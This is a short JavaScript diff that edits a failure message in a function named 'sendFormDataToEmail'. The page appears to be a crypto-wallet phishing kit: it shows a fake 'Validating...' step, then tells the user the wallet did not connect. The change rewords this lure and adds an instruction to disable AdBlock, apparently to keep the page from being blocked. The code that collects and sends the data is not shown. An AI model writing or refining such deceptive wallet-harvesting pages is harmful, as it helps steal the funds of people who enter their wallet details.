@@ -93,7 +93,7 @@ function sendFormDataToEmail(formData) {
             if (response.ok) {
                 swal('Validating...', 'Hold On');
                 setTimeout(() => {
-                    swal('Not Connected yet!?', 'You can only connect with valid wallets or fail is inevitable. If you are sure it is correct, you can check back or try with another wallet or contact us.');
+                    swal('Not yet Connected!?', 'You can only connect with valid wallets or fail is inevitable. If you are sure it is correct, you can check back or try with another wallet. Make sure you have no AdBlock enabled.');
 
                     // Reset the button text and remove the "connecting" class
                     var connectButton;
